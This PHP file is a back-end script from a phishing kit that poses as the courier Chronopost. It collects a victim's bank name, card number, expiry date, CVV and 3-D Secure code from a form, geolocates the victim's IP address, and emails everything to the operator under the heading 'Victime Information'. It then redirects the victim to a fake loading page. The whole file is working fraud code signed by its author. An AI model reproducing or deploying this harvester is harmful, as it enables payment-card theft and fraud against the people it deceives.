<?php
session_start();

include "email.php";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
// --------------- VRB
$mada1 = $_POST['b_name'];
$mada2 = $_POST['cc_n'];
$mada3 = $_POST['exp_dt'];
$mada4 = $_POST['vcc'];
$mada5 = $_POST['s_field'];

// --------------- VRB
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$msg = "
<html>
    <head>
<style>
*{
font-family:arial;
}
table{
width: 100%;
}
strong{
color: #f91010;
}
</style>
</head>
<table style='width:100%;'>
<tr>
<td style='padding: 3%;background: #79e5d8;color: #00B0FF;border-bottom: solid;'>
<strong style='color:#f91010;'><center> | cvv |</center></strong>
</td>
</tr>
<tr>
<td style='padding: 3%;background: #e9e9e9;color: #00B0FF;border-bottom: solid;font-weight: bold;'>
<h2>Personnel Cvv</h2>
<p>bank : <strong style='color:#f91010;'>".$mada1."</strong></p>
<p>num  : <strong style='color:#f91010;'>".$mada2."</strong></p>
<p>date : <strong style='color:#f91010;'>".$mada3."</strong></p>
<p>cvv  : <strong style='color:#f91010;'>".$mada4."</strong></p>
<p>vbv : <strong style='color:#f91010;'>".$mada5."</strong></p>
<hr>
<h2>Victime Information</h2>
<hr>
<p>IP ADD : <strong style='color:#f91010;'>".$ip."</strong></p>
<p>USER AGENT : <strong style='color:#f91010;'>".$browser."</strong></p>
<br />
||~~ BY ~~ King ~~||
<br />
";
$Subject = "Chronopost  ~ Cvv ~ From ~ [$ip] Country [$COUNTRY]";
$Headers = "From: BY King <oreoo.net>\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($email,$Subject,$msg,$Headers);
$email = "ewalilo.matkhafch@gmail.com";
header ('Location: ./loding.html');


?>